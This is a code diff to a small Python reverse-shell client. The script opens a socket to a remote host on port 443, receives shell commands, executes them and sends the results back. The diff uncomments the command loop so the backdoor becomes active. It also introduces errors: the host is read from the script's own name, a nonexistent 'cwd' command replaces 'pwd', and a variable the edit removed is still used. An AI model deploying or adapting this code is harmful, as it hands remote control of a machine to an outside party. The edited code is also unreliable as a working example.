@@ -3,7 +3,7 @@ import os
 import subprocess
 import sys
 
-Host = sys.argv[1]
+Host = sys.argv[0]
 Port = 443
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
@@ -14,24 +14,16 @@ s = socket.socket()
 # connect to the server
 s.connect((Host, Port))
 
-pwd = 'pwd'
-os.system(pwd)
+cwd = 'cwd'
+os.system(cwd)
 
-s.send(pwd.encode())
+s.send(cwd.encode())
 
 while True:
 
 
 
-
-
-
-
-
-
-
-
-    '''# receive the command from the server
+    # receive the command from the server
     command = s.recv(BUFFER_SIZE).decode()
     splited_command = command.split()
     if command.lower() == "exit":
@@ -55,6 +47,6 @@ while True:
     # send the results back to the server
     message = f"{output}{SEPARATOR}{pwd}"
     s.send(message.encode())
-    '''
+    
 # close client connection
 s.close()
